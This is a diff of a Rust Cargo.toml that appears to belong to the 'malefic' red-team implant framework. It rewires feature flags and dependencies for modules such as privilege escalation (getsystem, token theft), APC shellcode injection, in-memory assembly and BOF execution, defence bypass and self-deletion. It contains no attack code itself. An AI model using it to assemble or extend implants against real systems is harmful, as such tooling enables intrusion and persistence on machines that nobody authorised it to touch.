@@ -18,6 +18,7 @@ crate-type = ["cdylib", "rlib"]
 default = ["full"]
 
 disable_register = []
+as_module_dll = ["malefic-module/ffi"]
 
 nano = []
 
@@ -28,28 +29,28 @@ base = [
 ]
 
 extend = [
-    "bypass", 
-    "kill", 
-    "whoami", 
-    "ps", 
-    "netstat", 
-    "registry", 
-    "service", 
-    "taskschd", 
-    "wmi",
-    "execute_bof", 
-    "execute_shellcode", 
-    "execute_assembly", 
+    "bypass",
+    "kill",
+    "whoami",
+    "ps",
+    "netstat",
+    "registry",
+    "service",
+    "taskschd",
+    "execute_bof",
+    "execute_shellcode",
+    "execute_assembly",
     "execute_armory",
-    "execute_exe", 
-    "execute_dll", 
-    "execute_local", 
-    "mkdir", 
+    "execute_exe",
+    "execute_dll",
+    "execute_local",
+    "mkdir",
+    "touch",
     "chmod"
 ]
 
 fs_full = [
-    "ls", "cd", "rm", "cp", "mv", "pwd", "mem", "mkdir", "chown", "chmod", "cat", "pipe","enum_drivers"
+    "ls", "cd", "rm", "cp", "mv", "pwd", "mem", "mkdir", "chown", "chmod", "cat", "touch", "pipe","enum_drivers"
 ]
 
 enum_drivers = []
@@ -62,34 +63,38 @@ mv = []
 pwd = []
 mem = []
 mkdir = []
+touch = []
 chmod = []
 chown = []
 cat = []
-pipe = []
+pipe = ["malefic-os-win/pipe"]
 
 sys_full = [
-    "info", "ps", "id", "env", "whoami", "kill", "bypass", "netstat", "wmi", "service", "inject",
+    "info", "ps", "id", "env", "whoami", "kill", "bypass", "netstat", "service", "inject",
     "registry", "taskschd",
-    "getsystem", "runas", "privs", "rev2self"
+    "getsystem", "runas", "privs", "rev2self",
+    "self_dele",
+    "wmi"
 ]
 
-info = ["malefic-helper/sysinfo"]
-ps = ["malefic-helper/sysinfo"]
+info = []
+ps = []
 id = []
 env = []
-whoami = ["malefic-helper/sysinfo"]
-kill = ["malefic-helper/sysinfo"]
-bypass = []
+whoami = []
+kill = []
+bypass = ["malefic-os-win/bypass"]
 netstat = []
-wmi = ["malefic-helper/wmi"]
-service = []
-registry = []
-taskschd = []
-getsystem = []
-runas = []
-rev2self = []
-privs = []
-inject = []
+service = ["malefic-os-win/service"]
+registry = ["malefic-os-win/reg"]
+taskschd = ["malefic-os-win/scheduler"]
+getsystem = ["malefic-os-win/token"]
+runas = ["malefic-os-win/token"]
+rev2self = ["malefic-os-win/token"]
+privs = ["malefic-os-win/token"]
+inject = ["malefic-os-win/token"]
+self_dele = []
+wmi = ["malefic-os-win/wmi"]
 
 execute_full = [
     "execute_assembly", 
@@ -108,17 +113,18 @@ execute_full = [
 
 exec = []
 open = []
-execute_shellcode = []
+execute_shellcode = ["malefic-loader/Win_Inject_APC"]
 execute_bof = []
-execute_assembly = ["malefic-helper/clr"]
-execute_powershell = ["malefic-helper/clr"]
+execute_assembly = ["malefic-os-win/clr", "malefic-os-win/bypass", "malefic-sysinfo/clr"]
+execute_powershell = ["malefic-os-win/clr", "malefic-os-win/bypass", "malefic-sysinfo/clr"]
 execute_armory = []
 execute_exe = []
 execute_dll = []
 execute_local = []
 dllspawn = []
+thread_spawn_test = []
 inline_local = []
-bof = ["execute_bof"]
+
 net = []
 net_full = ["upload", "download"]
 
@@ -128,19 +134,26 @@ download = []
 
 [dependencies]
 anyhow = { workspace = true }
-thiserror = { workspace = true }
 futures = { workspace = true }
+futures-channel = { workspace = true }
 futures-timer = { workspace = true }
-obfstr = { workspace = true }
+malefic-gateway = { workspace = true }
+malefic-features = { workspace = true }
 async-trait = { workspace = true }
-lazy_static = { workspace = true }
-malefic-helper = { path= "../malefic-helper" }
-malefic-trait = { path = "../malefic-trait"}
-malefic-proto = { path = "../malefic-proto" }
-tokio = { workspace = true, features = ["time", "rt"] }
+malefic-common = { workspace = true }
+malefic-process = { workspace = true }
+malefic-net = { workspace = true }
+malefic-sysinfo = { workspace = true }
+malefic-loader = { workspace = true }
+malefic-proto = { workspace = true }
+malefic-module = { workspace = true }
 tar = { workspace = true }
 
+[target.'cfg(target_os = "windows")'.dependencies]
+malefic-os-win = { workspace = true }
 
-[build-dependencies]
-prost-build = { workspace = true }
-lazy_static = { workspace = true }
+
+[dev-dependencies]
+tokio = { workspace = true, features = ["rt", "rt-multi-thread", "macros", "time"] }
+futures-channel = { workspace = true }
+sha2 = { workspace = true }
